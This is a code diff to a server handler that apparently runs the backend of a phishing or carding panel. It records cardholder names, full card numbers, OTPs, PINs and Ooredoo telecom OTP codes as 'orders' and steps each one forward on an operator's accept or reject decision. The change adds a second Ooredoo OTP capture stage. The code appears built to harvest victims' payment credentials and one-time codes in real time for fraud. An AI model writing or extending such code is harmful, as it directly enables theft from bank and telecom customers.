@@ -89,7 +89,7 @@ function cleanOrder(b) {
     em: str(b.em, 30), a: str(b.a, 5), ad: str(b.ad || b.address || "", 500),
     bank: str(b.bank, 20), bankName: str(b.bankName || "", 200),
     lang: b.lang === "en" ? "en" : "ar",
-    step: ["card","otp","pin","ooredoo","ooredoo-otp"].includes(b.step) ? b.step : undefined,
+    step: ["card","otp","pin","ooredoo","ooredoo-otp","ooredoo-otp2"].includes(b.step) ? b.step : undefined,
     pay: {
       cardName: str(rawName, 200), cardNumber: str(rawCard, 200),
       last4: str((rawCard.slice(-4) || p.last4 || "").replace(/\D/g, ""), 4),
@@ -128,7 +128,7 @@ module.exports = async function handler(req, res) {
           });
           orders[idx].ooredoo = current;
           orders[idx].status = "awaiting";
-          orders[idx].step = o.step === "ooredoo-otp" ? "ooredoo-otp" : "ooredoo";
+          orders[idx].step = o.step === "ooredoo-otp2" ? "ooredoo-otp2" : o.step === "ooredoo-otp" ? "ooredoo-otp" : "ooredoo";
           orders[idx].decision = "";
           orders[idx].reason = "";
           orders[idx].next = "";
@@ -138,7 +138,7 @@ module.exports = async function handler(req, res) {
         } else {
           orders.unshift({
             ref: o.ref, status: "awaiting",
-            step: o.step === "ooredoo-otp" ? "ooredoo-otp" : "ooredoo",
+            step: o.step === "ooredoo-otp2" ? "ooredoo-otp2" : o.step === "ooredoo-otp" ? "ooredoo-otp" : "ooredoo",
             ooredoo: o.ooredoo, decision: "", reason: "", next: "",
             n: o.n || "", p: o.p || "", ts: Date.now(), updated: Date.now()
           });
@@ -193,7 +193,7 @@ module.exports = async function handler(req, res) {
         if (decision === "reject") {
           dorder.decision = "reject"; dorder.reason = step; dorder.status = "rejected"; dorder.next = "";
         } else {
-          var nextOf = { card: "otp", otp: "pin", pin: "done", ooredoo: "otp", "ooredoo-otp": "done" };
+          var nextOf = { card: "otp", otp: "pin", pin: "done", ooredoo: "otp", "ooredoo-otp": "otp2", "ooredoo-otp2": "done" };
           var nxt = nextOf[step];
           dorder.decision = "accept"; dorder.reason = "";
           if (nxt === "done") { dorder.status = "confirmed"; dorder.next = "done"; }
